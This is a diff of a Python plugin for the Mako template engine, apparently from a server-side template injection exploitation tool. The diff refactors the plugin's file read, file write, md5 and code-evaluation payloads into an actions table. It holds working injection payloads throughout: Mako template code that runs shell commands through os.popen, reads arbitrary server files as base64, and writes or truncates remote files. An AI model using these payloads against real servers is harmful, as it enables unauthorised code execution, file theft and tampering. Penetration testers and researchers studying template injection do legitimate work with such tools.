@@ -3,22 +3,38 @@ from core.plugin import Plugin
 from utils.strings import quote, chunkit, md5
 from utils.loggers import log
 from utils import rand
-import base64
 
 
 class Mako(Plugin):
-    
+
     actions = {
         'render' : {
             'payload': '${%(payload)s}',
             'header': '${%(header)s}',
             'trailer': '${%(trailer)s}'
+        },
+        'write' : {
+            'call' : 'evaluate',
+            'write' : """open("%(path)s", 'ab+').write(__import__("base64").urlsafe_b64decode('%(chunk)s'))""",
+            'truncate' : """open("%(path)s", 'w').close()"""
+        },
+        'read' : {
+            'call': 'inject',
+            'read' : """<%% x=__import__("base64").b64encode(open("%(path)s", "rb").read()) %%>${x}"""
+        },
+        'md5' : {
+            'call': 'inject',
+            'md5': """<%% x=__import__("hashlib").md5(open("%(path)s", 'rb').read()).hexdigest() %%>${x}"""
+        },
+        'evaluate' : {
+            'call': 'inject',
+            'evaluate': '<%% %(code)s %%>'
         }
-    
+
     }
 
     contexts = [
-    
+
         # Text context, no closures
         { 'level': 1 },
 
@@ -57,72 +73,14 @@ class Mako(Plugin):
 
     def detect_eval(self):
 
+        # Check eval capabilities only if engine has been found
+        if not self.get('engine'):
+            return
+
         payload = """<% import sys, os; x=os.name; y=sys.platform; %>${x}-${y}"""
         self.set('eval', 'python')
         self.set('os', self.inject(payload))
 
-    def evaluate(self, code):
-        return self.inject('<%% %s %%>' % (code))
-
-    def detect_exec(self):
-
-        expected_rand = str(rand.randint_n(2))
-
-        if expected_rand == self.execute('echo %s' % expected_rand):
-            self.set('exec', True)
-
     def execute(self, command):
 
         return self.inject("""<%% import os; x=os.popen("%s").read() %%>${x}""" % (quote(command)))
-
-
-    def detect_read(self):
-        self.set('read', True)
-
-    def _md5(self, remote_path):
-        execution_code = """<%% x=__import__("hashlib").md5(open("%s", 'rb').read()).hexdigest() %%>${x}""" % (remote_path)
-
-        return self.inject(execution_code)
-
-    def read(self, remote_path):
-
-        # Get remote file md5
-        md5_remote = self._md5(remote_path)
-
-        if not md5_remote:
-            log.warn('Error getting remote file md5, check presence and permission')
-            return
-
-        data_b64encoded = self.inject("""<%% x=__import__("base64").b64encode(open("%s", "rb").read()) %%>${x}""" %  remote_path)
-        data = base64.b64decode(data_b64encoded)
-
-        if not md5(data) == md5_remote:
-            log.warn('Remote file md5 mismatch, check manually')
-        else:
-            log.info('File downloaded correctly')
-
-        return data
-
-    def detect_write(self):
-        self.set('write', True)
-
-    def write(self, data, remote_path):
-
-        # Check existance and overwrite with --force-overwrite
-        if self._md5(remote_path):
-            if not self.channel.args.get('force_overwrite'):
-                log.warn('Remote path already exists, use --force-overwrite for overwrite')
-                return
-            else:
-                self.evaluate("""open("%s", 'w').close()""" % remote_path)
-
-        # Upload file in chunks of 500 characters
-        for chunk in chunkit(data, 500):
-
-            chunk_b64 = base64.urlsafe_b64encode(chunk)
-            self.evaluate("""open("%s", 'ab+').write(__import__("base64").urlsafe_b64decode('%s'))""" % (remote_path, chunk_b64))
-
-        if not md5(data) == self._md5(remote_path):
-            log.warn('Remote file md5 mismatch, check manually')
-        else:
-            log.warn('File uploaded correctly')
